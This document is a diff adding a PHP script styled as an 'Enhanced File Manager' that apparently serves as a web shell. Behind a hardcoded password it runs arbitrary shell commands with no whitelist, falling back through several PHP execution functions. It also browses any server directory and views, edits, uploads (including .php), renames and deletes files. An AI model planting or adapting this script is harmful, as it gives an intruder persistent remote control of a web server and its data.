@@ -1,0 +1,603 @@
+<?php
+// ============================================
+// ENHANCED FILE MANAGER v3.0
+// ============================================
+
+// ===== KONFIGURASI =====
+define('UPLOAD_MAX_SIZE', 10485760); // 10MB
+define('ALLOWED_EXTENSIONS', ['txt', 'pdf', 'doc', 'docx', 'xls', 'xlsx', 'jpg', 'jpeg', 'png', 'gif', 'zip', 'rar', 'tar.gz', 'sql', 'csv', 'php', 'html', 'css', 'js', 'json', 'xml']);
+define('SESSION_TIMEOUT', 3600); // 1 hour
+define('VERSION', '3.0');
+
+// ===== SESSION MANAGEMENT =====
+@session_start();
+
+// Check session timeout
+if(isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > SESSION_TIMEOUT)) {
+    session_unset();
+    session_destroy();
+    $_SESSION['authenticated'] = false;
+}
+$_SESSION['last_activity'] = time();
+
+// ===== AUTHENTICATION =====
+// Ganti dengan password yang lebih kuat!
+define('AUTH_PASSWORD', 'admin26889'); // CHANGE THIS!
+
+if(!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
+    if(isset($_POST['password']) && $_POST['password'] === AUTH_PASSWORD) {
+        $_SESSION['authenticated'] = true;
+        $_SESSION['last_activity'] = time();
+    } else {
+        // Show login form
+        ?>
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Secure FM - Login</title>
+            <style>
+                *{box-sizing:border-box;margin:0;padding:0}
+                body{background:#0a0e1a;color:#e8edf5;font-family:system-ui;min-height:100vh;display:flex;align-items:center;justify-content:center}
+                .login-box{background:#111827;padding:40px;border-radius:12px;border:1px solid #2d3f5e;width:100%;max-width:400px;box-shadow:0 8px 32px rgba(0,0,0,.5)}
+                h1{font-size:24px;margin-bottom:8px;display:flex;align-items:center;gap:10px}
+                .sub{color:#8898b3;margin-bottom:25px;font-size:14px}
+                .input-group{margin-bottom:18px}
+                label{display:block;margin-bottom:6px;font-size:13px;font-weight:600;color:#8898b3;text-transform:uppercase;letter-spacing:.5px}
+                input{width:100%;padding:12px 14px;background:#0a0e1a;border:1px solid #2d3f5e;border-radius:6px;color:#e8edf5;font-size:14px;outline:none;transition:.15s}
+                input:focus{border-color:#4f8ef7}
+                button{width:100%;padding:12px;background:#4f8ef7;border:none;border-radius:6px;color:#fff;font-weight:600;font-size:14px;cursor:pointer;transition:.15s}
+                button:hover{background:#3a7bdd;transform:translateY(-1px)}
+                .error{background:rgba(248,113,113,.1);color:#f87171;padding:10px 14px;border-radius:6px;border-left:3px solid #f87171;margin-bottom:16px;font-size:13px}
+                .lock{font-size:32px}
+            </style>
+        </head>
+        <body>
+            <div class="login-box">
+                <h1><span class="lock">🔒</span> Secure FM</h1>
+                <div class="sub">v<?=VERSION?> - Enter password to access</div>
+                <?php if(isset($_POST['password']) && $_POST['password'] !== AUTH_PASSWORD): ?>
+                    <div class="error">✗ Invalid password. Please try again.</div>
+                <?php endif; ?>
+                <form method="post">
+                    <div class="input-group">
+                        <label>Password</label>
+                        <input type="password" name="password" placeholder="Enter password..." autofocus required>
+                    </div>
+                    <button type="submit">Unlock 📂</button>
+                </form>
+            </div>
+        </body>
+        </html>
+        <?php
+        exit;
+    }
+}
+
+// ===== CORE FUNCTIONS =====
+function hsc($s){return htmlspecialchars($s, ENT_QUOTES, 'UTF-8');}
+function nf($n,$d=2){return number_format($n,$d);}
+function x($b){return rtrim(strtr(base64_encode($b), '+/', '-_'), '=');}
+function y($b){return base64_decode(str_pad(strtr($b, '-_', '+/'), strlen($b) % 4, '=', STR_PAD_RIGHT));}
+function safePath($p,$fb){
+    if(empty(trim($p))) return $fb;
+    $p = y($p);
+    $real = @realpath($p);
+    if($real === false || !is_dir($real)) return $fb;
+    return $real;
+}
+function deleteDir($d){
+    if(!file_exists($d)) return true;
+    if(!is_dir($d)) return @unlink($d);
+    foreach(scandir($d) as $i){
+        if($i == '.' || $i == '..') continue;
+        if(!deleteDir($d.DIRECTORY_SEPARATOR.$i)) return false;
+    }
+    return @rmdir($d);
+}
+function fmtSize($b){
+    if($b >= 1073741824) return nf($b/1073741824).' GB';
+    if($b >= 1048576) return nf($b/1048576).' MB';
+    if($b >= 1024) return nf($b/1024).' KB';
+    return $b.' B';
+}
+function getOwner($p){
+    $u = @fileowner($p);
+    if($u === false) return '—';
+    if(function_exists('posix_getpwuid')){
+        $i = posix_getpwuid($u);
+        return $i ? hsc($i['name']) : $u;
+    }
+    return $u;
+}
+
+// ===== COMMAND EXECUTION (Tanpa Whitelist) =====
+function runCmd($cmd){
+    // Escape command untuk keamanan dasar
+    $cmd = trim($cmd);
+    
+    $out = ''; $err = ''; $mt = '';
+    
+    if(function_exists('proc_open')){
+        $ds = [0=>['pipe','r'], 1=>['pipe','w'], 2=>['pipe','w']];
+        $p = proc_open($cmd, $ds, $pp);
+        if(is_resource($p)){
+            $out = stream_get_contents($pp[1]);
+            $err = stream_get_contents($pp[2]);
+            fclose($pp[1]); fclose($pp[2]);
+            proc_close($p);
+            $mt = 'proc_open';
+        }
+    } elseif(function_exists('shell_exec')){
+        $out = (string)@shell_exec($cmd.' 2>&1');
+        $mt = 'shell_exec';
+    } elseif(function_exists('exec')){
+        exec($cmd.' 2>&1', $lines);
+        $out = implode("\n", $lines);
+        $mt = 'exec';
+    } elseif(function_exists('system')){
+        ob_start();
+        system($cmd.' 2>&1');
+        $out = ob_get_clean();
+        $mt = 'system';
+    } elseif(function_exists('passthru')){
+        ob_start();
+        passthru($cmd.' 2>&1');
+        $out = ob_get_clean();
+        $mt = 'passthru';
+    } else {
+        return ['out' => '', 'err' => 'No command execution method available', 'mt' => 'none'];
+    }
+    
+    return ['out' => $out, 'err' => $err, 'mt' => $mt];
+}
+
+// ===== VALIDATE FILE UPLOAD =====
+function validateUpload($file) {
+    if($file['error'] !== UPLOAD_ERR_OK) {
+        $errors = [
+            UPLOAD_ERR_INI_SIZE => 'File too large (server limit)',
+            UPLOAD_ERR_FORM_SIZE => 'File too large (form limit)',
+            UPLOAD_ERR_PARTIAL => 'File only partially uploaded',
+            UPLOAD_ERR_NO_FILE => 'No file uploaded'
+        ];
+        return ['valid' => false, 'error' => $errors[$file['error']] ?? 'Unknown upload error'];
+    }
+    
+    if($file['size'] > UPLOAD_MAX_SIZE) {
+        return ['valid' => false, 'error' => 'File too large. Max: ' . fmtSize(UPLOAD_MAX_SIZE)];
+    }
+    
+    $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
+    if(!in_array($ext, ALLOWED_EXTENSIONS)) {
+        return ['valid' => false, 'error' => "File type '{$ext}' not allowed"];
+    }
+    
+    return ['valid' => true];
+}
+
+// ===== GENERATE CSRF TOKEN =====
+function generateCSRF() {
+    if(empty($_SESSION['csrf_token'])) {
+        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+    }
+    return $_SESSION['csrf_token'];
+}
+
+function verifyCSRF($token) {
+    return isset($_SESSION['csrf_token']) && hash_equals($_SESSION['csrf_token'], $token);
+}
+
+// ===== PATH HANDLING =====
+date_default_timezone_set(date_default_timezone_get());
+$S = dirname(realpath(__FILE__));
+$D = safePath(isset($_GET['d']) && $_GET['d'] !== '' ? $_GET['d'] : $S, $S);
+
+if(!@chdir($D)){
+    $D = $S;
+    @chdir($D);
+}
+
+$sm = '';
+$vr = '';
+
+// ===== PROCESS POST REQUESTS =====
+if($_SERVER['REQUEST_METHOD'] === 'POST'){
+    // Verify CSRF token for all POST requests except login
+    if(!isset($_POST['csrf_token']) || !verifyCSRF($_POST['csrf_token'])) {
+        $sm = '<div class="alt err">✗Security token invalid. Please refresh page.</div>';
+    } else {
+        // ===== FILE UPLOAD =====
+        if(isset($_FILES['fileToUpload'])){
+            $validation = validateUpload($_FILES['fileToUpload']);
+            if(!$validation['valid']) {
+                $sm = '<div class="alt err">✗ ' . hsc($validation['error']) . '</div>';
+            } else {
+                // Generate safe filename
+                $original = basename($_FILES['fileToUpload']['name']);
+                $ext = pathinfo($original, PATHINFO_EXTENSION);
+                $name = pathinfo($original, PATHINFO_FILENAME);
+                // Remove dangerous characters
+                $clean_name = preg_replace('/[^a-zA-Z0-9._-]/', '_', $name);
+                $target = $D . '/' . $clean_name . '.' . $ext;
+                
+                // Handle duplicate files
+                $counter = 1;
+                while(file_exists($target)) {
+                    $target = $D . '/' . $clean_name . '_' . $counter . '.' . $ext;
+                    $counter++;
+                }
+                
+                $sm = move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $target)
+                    ? '<div class="alt ok">✓ File "<b>' . hsc($original) . '</b>" uploaded successfully.</div>'
+                    : '<div class="alt err">✗ Upload failed. Check directory permissions.</div>';
+            }
+        }
+        // ===== CREATE FOLDER =====
+        elseif(!empty($_POST['folder_name'])){
+            $folderName = preg_replace('/[^a-zA-Z0-9._-]/', '_', $_POST['folder_name']);
+            if(empty($folderName)) {
+                $sm = '<div class="alt err">✗ Invalid folder name.</div>';
+            } else {
+                $nf = $D.'/'.$folderName;
+                $sm = !file_exists($nf) && @mkdir($nf, 0755)
+                    ? '<div class="alt ok">✓ Folder "<b>' . hsc($folderName) . '</b>" created.</div>'
+                    : '<div class="alt err">✗ Failed to create folder or already exists.</div>';
+            }
+        }
+        // ===== CREATE/EDIT FILE =====
+        elseif(!empty($_POST['file_name'])){
+            $fileName = basename($_POST['file_name']);
+            $fileName = preg_replace('/[^a-zA-Z0-9._-]/', '_', $fileName);
+            if(empty($fileName)) {
+                $sm = '<div class="alt err">✗ Invalid file name.</div>';
+            } else {
+                $nf = $D.'/'.$fileName;
+                $content = $_POST['file_content'];
+                $vb = file_exists($nf) ? 'updated' : 'created';
+                $sm = file_put_contents($nf, $content) !== false
+                    ? '<div class="alt ok">✓ File "<b>' . hsc($fileName) . '</b>" ' . $vb . '.</div>'
+                    : '<div class="alt err">✗ Failed to save file.</div>';
+            }
+        }
+        // ===== DELETE =====
+        elseif(isset($_POST['delete_file'])){
+            $t = $D.'/'.basename($_POST['delete_file']);
+            if(file_exists($t)){
+                $ok = is_dir($t) ? deleteDir($t) : @unlink($t);
+                $sm = $ok
+                    ? '<div class="alt ok">✓ Item deleted successfully.</div>'
+                    : '<div class="alt err">✗ Delete failed. Check permissions.</div>';
+            } else {
+                $sm = '<div class="alt err">✗ Item not found.</div>';
+            }
+        }
+        // ===== RENAME =====
+        elseif(isset($_POST['rename_item'], $_POST['old_name'], $_POST['new_name'])){
+            $old = $D.'/'.basename($_POST['old_name']);
+            $newName = basename($_POST['new_name']);
+            $newName = preg_replace('/[^a-zA-Z0-9._-]/', '_', $newName);
+            if(empty($newName)) {
+                $sm = '<div class="alt err">✗ Invalid new name.</div>';
+            } else {
+                $new = $D.'/'.$newName;
+                if(file_exists($old)) {
+                    $sm = rename($old, $new)
+                        ? '<div class="alt ok">✓ Renamed to "<b>' . hsc($newName) . '</b>".</div>'
+                        : '<div class="alt err">✗ Rename failed.</div>';
+                } else {
+                    $sm = '<div class="alt err">✗ Item not found.</div>';
+                }
+            }
+        }
+        // ===== COMMAND (Tanpa Whitelist) =====
+        elseif(isset($_POST['cmd_input'])){
+            $result = runCmd($_POST['cmd_input']);
+            if($result['mt'] === 'none') {
+                $vr = '<div class="alt err">✗ No command execution method available.</div>';
+            } else {
+                $cnt = hsc(!empty($result['err']) ? $result['err'] : $result['out']);
+                $lbl = !empty($result['err']) ? '⚠ Error' : '✓ Output';
+                $vr = '<div class="rp">
+                    <div class="rph">
+                        <span>⚡ <code>' . hsc($_POST['cmd_input']) . '</code> <span class="rl">' . hsc($result['mt']) . '</span></span>
+                        <span class="rl">' . $lbl . '</span>
+                    </div>
+                    <pre class="rpre">' . $cnt . '</pre>
+                </div>';
+            }
+        }
+        // ===== VIEW FILE =====
+        elseif(isset($_POST['view_file'])){
+            $f = $D.'/'.basename($_POST['view_file']);
+            if(file_exists($f) && is_file($f)) {
+                $content = file_get_contents($f);
+                if($content !== false) {
+                    $vr = '<div class="rp">
+                        <div class="rph">
+                            <span>📄 <code>' . hsc(basename($f)) . '</code></span>
+                            <span class="rl">' . fmtSize(filesize($f)) . '</span>
+                        </div>
+                        <pre class="rpre">' . hsc($content) . '</pre>
+                    </div>';
+                } else {
+                    $vr = '<div class="alt err">✗ Could not read file.</div>';
+                }
+            } else {
+                $vr = '<div class="alt err">✗ File not found or is a directory.</div>';
+            }
+        }
+    }
+}
+
+// ===== LOGOUT =====
+if(isset($_GET['logout'])) {
+    session_destroy();
+    header('Location: ' . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// ===== SCAN DIRECTORY =====
+$dirs = []; $files = [];
+if(!empty($D) && is_dir($D)){
+    $raw = @scandir($D);
+    if($raw){
+        foreach(array_diff($raw, ['.', '..']) as $i){
+            $fullPath = $D.'/'.$i;
+            if(@is_dir($fullPath)) $dirs[] = $i;
+            else $files[] = $i;
+        }
+    }
+}
+natcasesort($dirs); natcasesort($files);
+$items = array_merge(array_values($dirs), array_values($files));
+$csrf_token = generateCSRF();
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>File Manager — <?=hsc(basename($D))?></title>
+<style>
+:root{--a:#0a0e1a;--b:#111827;--c:#1a2235;--e:#2d3f5e;--f:#e8edf5;--g:#8898b3;--h:#536282;--i:#4f8ef7;--k:#34d399;--l:#f87171;--m:#fbbf24;--n:#a78bfa;--o:#22d3ee;--p:8px;--q:0 4px 24px rgba(0,0,0,.45)}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--a);color:var(--f);font-family:system-ui,-apple-system,sans-serif;font-size:13px;line-height:1.6;min-height:100vh}
+.wp{max-width:1280px;margin:0 auto;padding:24px 20px 60px}
+.topbar{display:flex;align-items:center;justify-content:space-between;gap:16px;padding:14px 20px;background:var(--b);border:1px solid var(--e);border-radius:var(--p);margin-bottom:18px;flex-wrap:wrap}
+.brand{display:flex;align-items:center;gap:10px}
+.brand .logo{width:32px;height:32px;background:linear-gradient(135deg,var(--i),var(--n));border-radius:7px;display:flex;align-items:center;justify-content:center;font-size:16px}
+.brand h1{font-size:16px;font-weight:700}
+.brand h1 span{color:var(--g);font-size:12px;font-weight:400}
+.meta{color:var(--g);font-size:12px;text-align:right}
+.meta b{color:var(--f);font-weight:500}
+.bc{display:flex;align-items:center;flex-wrap:wrap;gap:2px;padding:10px 16px;background:var(--b);border:1px solid var(--e);border-radius:var(--p);margin-bottom:16px;font-size:12px;color:var(--g)}
+.bc a{color:var(--i);text-decoration:none;padding:2px 5px;border-radius:4px;transition:background .15s}
+.bc a:hover{background:rgba(79,142,247,.12)}
+.bc .sep{color:var(--h);margin:0 1px}
+.ht{background:rgba(52,211,153,.12);color:var(--k);padding:1px 8px;border-radius:20px;font-weight:600;font-size:11px;margin-left:4px}
+.ac{display:flex;gap:10px;margin-bottom:18px;flex-wrap:wrap}
+.bn{display:inline-flex;align-items:center;gap:7px;padding:9px 16px;border:none;border-radius:var(--p);font-family:inherit;font-size:13px;font-weight:600;cursor:pointer;transition:all .18s;white-space:nowrap}
+.bn:hover{transform:translateY(-1px);box-shadow:0 4px 14px rgba(0,0,0,.35)}
+.bg{background:rgba(52,211,153,.15);color:var(--k);border:1px solid rgba(52,211,153,.3)}
+.bb{background:rgba(79,142,247,.15);color:var(--i);border:1px solid rgba(79,142,247,.3)}
+.by{background:rgba(251,191,36,.15);color:var(--m);border:1px solid rgba(251,191,36,.3)}
+.br{background:rgba(248,113,113,.15);color:var(--l);border:1px solid rgba(248,113,113,.3)}
+.bg:hover{background:rgba(52,211,153,.25)}
+.bb:hover{background:rgba(79,142,247,.25)}
+.by:hover{background:rgba(251,191,36,.25)}
+.br:hover{background:rgba(248,113,113,.25)}
+.alt{padding:11px 16px;border-radius:var(--p);margin-bottom:16px;font-size:13px;font-weight:500}
+.ok{background:rgba(52,211,153,.1);color:var(--k);border-left:3px solid var(--k)}
+.err{background:rgba(248,113,113,.1);color:var(--l);border-left:3px solid var(--l)}
+.rp{background:var(--b);border:1px solid var(--e);border-radius:var(--p);margin-bottom:18px;overflow:hidden}
+.rph{display:flex;align-items:center;justify-content:space-between;padding:10px 16px;background:var(--c);border-bottom:1px solid var(--e);font-size:12px;color:var(--g)}
+.rph code{font-family:monospace;color:var(--o);font-size:12px}
+.rl{font-size:11px;padding:2px 8px;border-radius:20px;background:rgba(167,139,250,.15);color:var(--n)}
+.rpre{padding:16px;font-family:monospace;font-size:12px;line-height:1.7;color:var(--f);overflow-x:auto;max-height:400px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
+.tw{border:1px solid var(--e);border-radius:var(--p);overflow:hidden;margin-bottom:30px}
+.ts{overflow-x:auto}
+.ft{width:100%;border-collapse:collapse;min-width:860px}
+.ft thead th{background:var(--c);padding:12px 14px;text-align:left;font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.6px;color:var(--g);border-bottom:1px solid var(--e);white-space:nowrap}
+.ft thead th:first-child{padding-left:18px}
+.ft tbody tr{transition:background .12s}
+.ft tbody tr:hover{background:rgba(255,255,255,.03)}
+.ft tbody tr+tr td{border-top:1px solid rgba(45,63,94,.5)}
+.ft td{padding:10px 14px;vertical-align:middle}
+.ft td:first-child{padding-left:18px}
+.nc{display:flex;align-items:center;gap:9px}
+.ic{width:30px;height:30px;border-radius:7px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:15px}
+.icd{background:rgba(251,191,36,.12)}
+.icf{background:rgba(79,142,247,.1)}
+.fl{color:var(--f);text-decoration:none;font-weight:500;font-size:13px}
+.fl:hover{color:var(--i)}
+.db{font-size:10px;font-weight:600;background:rgba(251,191,36,.15);color:var(--m);padding:1px 7px;border-radius:20px;margin-left:4px}
+.cs,.cd{color:var(--g);font-size:12px;white-space:nowrap}
+.cd{font-family:monospace}
+.cp{font-family:monospace;font-size:12px;color:var(--o)}
+.cow{color:var(--n);font-size:12px;font-weight:500}
+.pw{color:var(--k)}
+.ca{display:flex;align-items:center;gap:6px}
+.tb{display:inline-flex;align-items:center;gap:4px;padding:5px 10px;border:none;border-radius:5px;font-size:11px;font-weight:600;font-family:inherit;cursor:pointer;transition:all .15s;white-space:nowrap}
+.tb:hover{transform:translateY(-1px)}
+.tbv{background:rgba(79,142,247,.15);color:var(--i);border:1px solid rgba(79,142,247,.25)}
+.tbd{background:rgba(248,113,113,.1);color:var(--l);border:1px solid rgba(248,113,113,.25)}
+.tbr{background:rgba(251,191,36,.1);color:var(--m);border:1px solid rgba(251,191,36,.25)}
+.tbv:hover{background:rgba(79,142,247,.28)}
+.tbd:hover{background:rgba(248,113,113,.25)}
+.tbr:hover{background:rgba(251,191,36,.22)}
+.rw{display:flex;gap:5px;align-items:center}
+.ri{padding:5px 9px;background:var(--a);border:1px solid var(--e);border-radius:5px;color:var(--f);font-size:12px;font-family:inherit;width:120px;outline:none;transition:border .15s}
+.ri:focus{border-color:var(--i)}
+.drow{background:rgba(251,191,36,.02)}
+.mo{position:fixed;inset:0;background:rgba(0,0,0,.8);backdrop-filter:blur(4px);display:none;align-items:center;justify-content:center;z-index:999;padding:20px}
+.mo.active{display:flex}
+.mx{background:var(--b);border:1px solid var(--e);border-radius:12px;width:100%;max-width:520px;box-shadow:var(--q);animation:fu .22s ease}
+@keyframes fu{from{opacity:0;transform:translateY(16px) scale(.97)}to{opacity:1;transform:none}}
+.mh{display:flex;align-items:center;justify-content:space-between;padding:18px 22px 16px;border-bottom:1px solid var(--e)}
+.mh h2{font-size:16px;font-weight:700}
+.mc{background:none;border:none;color:var(--g);cursor:pointer;font-size:20px;line-height:1;padding:0 2px;border-radius:4px;transition:color .15s}
+.mc:hover{color:var(--f)}
+.mb{padding:22px}
+.fg{margin-bottom:16px}
+.flb{display:block;margin-bottom:6px;font-size:12px;font-weight:600;color:var(--g);text-transform:uppercase;letter-spacing:.5px}
+.fi,.fta{width:100%;padding:10px 12px;background:var(--a);border:1px solid var(--e);border-radius:6px;color:var(--f);font-family:inherit;font-size:13px;outline:none;transition:border .15s}
+.fi:focus,.fta:focus{border-color:var(--i)}
+.fta{min-height:160px;resize:vertical;font-family:monospace;font-size:12px}
+.mf{display:flex;gap:10px;padding-top:6px}
+.mf .bn{flex:1;justify-content:center}
+.foot{text-align:center;color:var(--h);font-size:12px;padding-top:10px;border-top:1px solid var(--e)}
+.status-badge{display:inline-block;padding:3px 8px;border-radius:20px;font-size:10px;font-weight:600;margin-left:6px}
+.status-badge.on{background:rgba(52,211,153,.15);color:var(--k)}
+.user-info{display:flex;align-items:center;gap:10px}
+.logout-btn{color:var(--l);text-decoration:none;font-size:11px;padding:4px 12px;border:1px solid rgba(248,113,113,.3);border-radius:20px;transition:.15s}
+.logout-btn:hover{background:rgba(248,113,113,.1)}
+.warning-badge{background:rgba(251,191,36,.15);color:var(--m);padding:2px 8px;border-radius:20px;font-size:10px;margin-left:6px}
+@media(max-width:600px){.ac{gap:7px}.bn{padding:8px 12px;font-size:12px}.meta{display:none}.user-info .logout-btn{font-size:10px;padding:3px 10px}}
+</style>
+</head>
+<body>
+<div class="wp">
+<div class="topbar">
+<div class="brand">
+<div class="logo">📂</div>
+<h1>File Manager <span>v<?=VERSION?></span></h1>
+</div>
+<div class="user-info">
+<span class="status-badge on">● Online</span>
+<a href="?logout=1" class="logout-btn" onclick="return confirm('Logout?')">🚪 Logout</a>
+<div class="meta">
+<b><?=php_uname('n')?></b> · PHP <?=PHP_VERSION?> · <?=date('Y-m-d H:i:s')?>
+</div>
+</div>
+</div>
+
+<div class="bc">
+<span>📍</span>&nbsp;
+<?php
+$parts = explode(DIRECTORY_SEPARATOR, $D);
+$built = '';
+foreach($parts as $pt){
+    if($pt === '') continue;
+    $built .= DIRECTORY_SEPARATOR . $pt;
+    echo '<span class="sep">/</span> <a href="?d='.x($built).'">'.hsc($pt).'</a> ';
+}
+?>
+<a href="?d=<?=x($S)?>" class="ht">⌂ Home</a>
+<span class="warning-badge">⚡ Full Command Access</span>
+</div>
+
+<div class="ac">
+<button class="bn bg" onclick="om('mF')">📁 New Folder</button>
+<button class="bn bb" onclick="om('mE')">📄 New/Edit File</button>
+<button class="bn by" onclick="om('mU')">⬆ Upload</button>
+<button class="bn br" onclick="om('mC')">⚡ Command</button>
+</div>
+
+<?=$sm?>
+<?=$vr?>
+
+<div class="tw">
+<div class="ts">
+<table class="ft">
+<thead>
+<tr>
+<th>Name</th>
+<th>Owner</th>
+<th>Size</th>
+<th>Modified</th>
+<th>Perms</th>
+<th>Actions</th>
+</tr>
+</thead>
+<tbody>
+<?php foreach($items as $v):
+$fp = $D.'/'.$v;
+$isdir = @is_dir($fp);
+$il = $isdir ? '?d='.x($fp) : '?d='.x($D).'&f='.x($v);
+$rp = @fileperms($fp);
+$perm = $rp !== false ? substr(sprintf('%o',$rp),-4) : '?';
+$wr = @is_writable($fp);
+$ow = getOwner($fp);
+$fs = !$isdir ? @filesize($fp) : false;
+$sz = $isdir ? '—' : ($fs !== false ? fmtSize($fs) : '?');
+$mt = @filemtime($fp);
+$mtime = $mt !== false ? date('Y-m-d H:i',$mt) : '—';
+$rc = $isdir ? 'drow' : '';
+?>
+<tr class="<?=$rc?>">
+<td>
+<div class="nc">
+<div class="ic <?=$isdir?'icd':'icf'?>"><?=$isdir?'📁':'📄'?></div>
+<div>
+<a href="<?=$il?>" class="fl"><?=hsc($v)?></a>
+<?php if($isdir) echo '<span class="db">DIR</span>'; ?>
+<?php if(!$isdir && strpos($v, '.php') !== false): ?>
+<span class="db" style="background:rgba(79,142,247,.15);color:var(--i)">⚡PHP</span>
+<?php endif; ?>
+</div>
+</div>
+</td>
+<td class="cow"><?=$ow?></td>
+<td class="cs"><?=$sz?></td>
+<td class="cd"><?=$mtime?></td>
+<td class="cp <?=$wr?'pw':''?>"><?=$perm?></td>
+<td>
+<div class="ca">
+<form method="post" style="display:inline">
+<input type="hidden" name="csrf_token" value="<?=$csrf_token?>">
+<input type="hidden" name="view_file" value="<?=hsc($v)?>">
+<button type="submit" class="tb tbv">👁 View</button>
+</form>
+<form method="post" style="display:inline" onsubmit="return confirm('Delete <?=addslashes(hsc($v))?>?')">
+<input type="hidden" name="csrf_token" value="<?=$csrf_token?>">
+<input type="hidden" name="delete_file" value="<?=hsc($v)?>">
+<button type="submit" class="tb tbd">🗑 Del</button>
+</form>
+<form method="post" style="display:inline">
+<input type="hidden" name="csrf_token" value="<?=$csrf_token?>">
+<input type="hidden" name="old_name" value="<?=hsc($v)?>">
+<div class="rw">
+<input type="text" name="new_name" class="ri" placeholder="New name…" required>
+<button type="submit" name="rename_item" class="tb tbr">✏ Ren</button>
+</div>
+</form>
+</div>
+</td>
+</tr>
+<?php endforeach; ?>
+</tbody>
+</table>
+</div>
+</div>
+
+<div class="foot">
+Enhanced File Manager v<?=VERSION?> · <?=count($dirs)?> folder<?=count($dirs)!=1?'s':''?>, <?=count($files)?> file<?=count($files)!=1?'s':''?>
+</div>
+</div>
+
+<!-- MODALS -->
+<div id="mF" class="mo"><div class="mx"><div class="mh"><h2>📁 New Folder</h2><button class="mc" onclick="cm('mF')">✕</button></div><div class="mb"><form method="post"><input type="hidden" name="csrf_token" value="<?=$csrf_token?>"><div class="fg"><label class="flb">Folder Name</label><input type="text" name="folder_name" class="fi" placeholder="my-folder" required autofocus pattern="[a-zA-Z0-9._-]+" title="Only letters, numbers, dots, underscores, and hyphens allowed"></div><div class="mf"><button type="button" class="bn br" onclick="cm('mF')">Cancel</button><button type="submit" class="bn bg">Create</button></div></form></div></div></div>
+
+<div id="mE" class="mo"><div class="mx"><div class="mh"><h2>📄 Create/Edit File</h2><button class="mc" onclick="cm('mE')">✕</button></div><div class="mb"><form method="post"><input type="hidden" name="csrf_token" value="<?=$csrf_token?>"><div class="fg"><label class="flb">File Name</label><input type="text" name="file_name" class="fi" placeholder="index.php" required pattern="[a-zA-Z0-9._-]+" title="Only letters, numbers, dots, underscores, and hyphens allowed"></div><div class="fg"><label class="flb">Content</label><textarea name="file_content" class="fta" placeholder="File content…" spellcheck="false"></textarea></div><div class="mf"><button type="button" class="bn br" onclick="cm('mE')">Cancel</button><button type="submit" class="bn bb">Save</button></div></form></div></div></div>
+
+<div id="mU" class="mo"><div class="mx"><div class="mh"><h2>⬆ Upload File</h2><button class="mc" onclick="cm('mU')">✕</button></div><div class="mb"><form method="post" enctype="multipart/form-data"><input type="hidden" name="csrf_token" value="<?=$csrf_token?>"><div class="fg"><label class="flb">Select File (Max <?=fmtSize(UPLOAD_MAX_SIZE)?>)</label><input type="file" name="fileToUpload" class="fi" required></div><div class="fg" style="font-size:11px;color:var(--g)">Allowed: <?=implode(', ', ALLOWED_EXTENSIONS)?></div><div class="mf"><button type="button" class="bn br" onclick="cm('mU')">Cancel</button><button type="submit" name="submit" class="bn by">Upload</button></div></form></div></div></div>
+
+<div id="mC" class="mo"><div class="mx"><div class="mh"><h2>⚡ Run Command</h2><button class="mc" onclick="cm('mC')">✕</button></div><div class="mb"><form method="post"><input type="hidden" name="csrf_token" value="<?=$csrf_token?>"><div class="fg"><label class="flb">Shell Command (Full Access)</label><input type="text" name="cmd_input" class="fi" placeholder="ls -la" required style="font-family:monospace"></div><div class="mf"><button type="button" class="bn br" onclick="cm('mC')">Cancel</button><button type="submit" class="bn br" style="background:rgba(248,113,113,.25)">Run</button></div></form></div></div></div>
+
+<script>
+function om(id){document.getElementById(id).classList.add('active');}
+function cm(id){document.getElementById(id).classList.remove('active');}
+window.addEventListener('click',function(e){if(e.target.classList.contains('mo')){cm(e.target.id);}});
+document.addEventListener('keydown',function(e){if(e.key==='Escape'){var modals=document.querySelectorAll('.mo.active');for(var i=0;i<modals.length;i++){modals[i].classList.remove('active');}}});
+
+// Auto-close modals after successful action
+<?php if(!empty($sm) || !empty($vr)): ?>
+setTimeout(function(){
+    document.querySelectorAll('.mo.active').forEach(function(m){m.classList.remove('active');});
+}, 3000);
+<?php endif; ?>
+</script>
+</body>
+</html>
